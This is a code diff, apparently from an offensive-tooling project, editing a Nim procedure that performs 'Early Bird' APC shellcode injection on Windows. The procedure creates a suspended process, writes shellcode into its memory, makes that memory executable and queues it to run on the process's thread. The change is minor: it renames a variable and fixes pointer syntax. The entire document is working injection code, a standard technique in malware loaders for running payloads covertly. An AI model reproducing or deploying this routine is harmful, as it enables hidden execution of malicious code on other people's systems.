@@ -14,7 +14,7 @@ proc earlybirdApcQueue[byte](shellcode: openArray[byte]): void =
     pHandle: HANDLE
     tHandle: HANDLE
     bytesWritten: SIZE_T
-    oldprotect: DWORD = 0
+    op: DWORD = 0
 
   CreateProcess(NULL, newWideCString(processImage), ps, ts, TRUE, CREATE_SUSPENDED, NULL, NULL, addr si.StartupInfo, addr pi)
 
@@ -24,9 +24,8 @@ proc earlybirdApcQueue[byte](shellcode: openArray[byte]): void =
   let rPtr = VirtualAllocEx(pHandle, nil, cast[DWORD](shellcode.len), MEM_COMMIT, PAGE_READWRITE)
   let apcRoutine = cast[PTHREAD_START_ROUTINE](rPtr);
 
-  
   WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
-  VirtualProtectEx(pHandle, rPtr, len(shellcode), PAGE_EXECUTE_READ, &oldprotect)
+  VirtualProtectEx(pHandle, rPtr, len(shellcode), PAGE_EXECUTE_READ, addr op)
   QueueUserAPC(cast[PAPCFUNC](apcRoutine), tHandle, cast[ULONG_PTR](nil))
   ResumeThread(tHandle)
 
